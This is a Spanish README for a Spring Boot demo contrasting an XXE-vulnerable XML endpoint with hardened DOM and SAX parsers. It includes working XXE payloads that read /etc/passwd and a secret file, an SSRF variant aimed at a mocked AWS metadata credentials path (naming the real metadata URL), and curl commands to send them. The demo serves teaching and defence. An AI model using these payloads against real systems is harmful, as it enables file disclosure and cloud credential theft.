# Demo XXE — Spring Boot (antes / después)

Demo de **XML External Entity (XXE)** en un endpoint que parsea perfiles de usuario en XML.

| Variante | Endpoint | Parser |
|----------|----------|--------|
| **ANTES — vulnerable** | `POST /api/profile/vulnerable` | `DocumentBuilderFactory` sin restricciones |
| **DESPUÉS — seguro (DOM)** | `POST /api/profile/seguro` | `XxeMitigationExample.secureDocumentBuilderFactory()` |
| **DESPUÉS — seguro (SAX)** | `POST /api/profile/seguro-sax` | `XxeMitigationExample.secureSAXParserFactory()` |

| Servicio | URL |
|----------|-----|
| API | http://localhost:8187 |

---

## Payload XXE clásico — lectura de archivo

En Docker el secreto está en `/app/demo-secrets/secret.txt`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/demo-secrets/secret.txt">
]>
<userProfile>
  <username>&xxe;</username>
</userProfile>
```

En Linux/macOS local (sin contenedor), puedes probar con `/etc/passwd`:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

**Vulnerable** → `usernameExtraido` contiene el contenido del archivo.  
**Seguro** → `exito: false` con error de DTD no permitido.

---

## Variante SSRF — metadatos simulados (AWS)

La demo expone un mock de `169.254.169.254` en:

`GET /internal/mock-metadata/iam/security-credentials/demo-role`

Payload XXE (desde el contenedor, `localhost` apunta al mismo servidor):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8187/internal/mock-metadata/iam/security-credentials/demo-role">
]>
<userProfile>
  <username>&xxe;</username>
</userProfile>
```

En AWS real el objetivo sería `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

---

## Cómo levantarlo

```bash
docker compose up --build
```

---

## Cómo probar

Guarda el payload en `payload.xml` y ejecuta:

```bash
# Normal (sin XXE)
curl -s -X POST http://localhost:8187/api/profile/vulnerable \
  -H "Content-Type: application/xml" \
  -d '<userProfile><username>ana</username></userProfile>'

# XXE — lectura de archivo (vulnerable)
curl -s -X POST http://localhost:8187/api/profile/vulnerable \
  -H "Content-Type: application/xml" \
  --data-binary @payload-file.xml

# Mismo payload en seguro → falla
curl -s -X POST http://localhost:8187/api/profile/seguro \
  -H "Content-Type: application/xml" \
  --data-binary @payload-file.xml
```

---

## La corrección (`XxeMitigationExample.java`)

**DOM — `DocumentBuilderFactory`:**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
dbf.setXIncludeAware(false);
dbf.setNamespaceAware(true);
```

**SAX — `SAXParserFactory`:**

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setXIncludeAware(false);
spf.setNamespaceAware(true);
```

> Preferir JSON cuando sea posible. Si debes parsear XML, usa siempre un factory
> endurecido como en `XxeMitigationExample`.
